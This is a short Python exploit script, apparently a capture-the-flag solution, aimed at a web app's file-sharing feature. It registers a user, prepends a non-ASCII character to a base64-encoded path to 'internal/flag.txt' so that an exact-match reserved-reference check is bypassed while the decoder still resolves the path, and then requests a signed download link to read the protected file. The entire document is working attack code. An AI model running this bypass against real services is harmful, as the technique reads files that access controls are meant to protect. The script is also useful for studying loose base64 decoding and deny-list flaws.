#!/usr/bin/env python3
import base64, sys, requests

BASE = sys.argv[1].rstrip("/")   # e.g. http://host:port
s = requests.Session()
u, p = "meowmet123", "password123"

# register (sets session cookie, redirects to dashboard)
r = s.post(f"{BASE}/register", data={"username": u, "password": p}, allow_redirects=True, timeout=15)
print("register:", r.status_code, r.url)

# forged reference: base64("internal/flag.txt") with a non-ASCII char prepended.
# b64decode ignores the non-ASCII bytes -> decodes to the flag path, but the string
# != RESERVED_REFERENCE_SET entry, so is_shareable's exact-match block is bypassed.
real = base64.b64encode(b"internal/flag.txt").decode()
forged = "€" + real
print("forged ref:", forged)

r = s.post(f"{BASE}/api/share", json={"ref": forged}, timeout=15)
print("share:", r.status_code, r.text[:300])
j = r.json()

r = s.get(f"{BASE}/download", params={"ref": j["ref"], "expires": j["expires"], "sig": j["sig"]}, timeout=15)
print("download:", r.status_code)
print("FLAG:", r.text.strip())
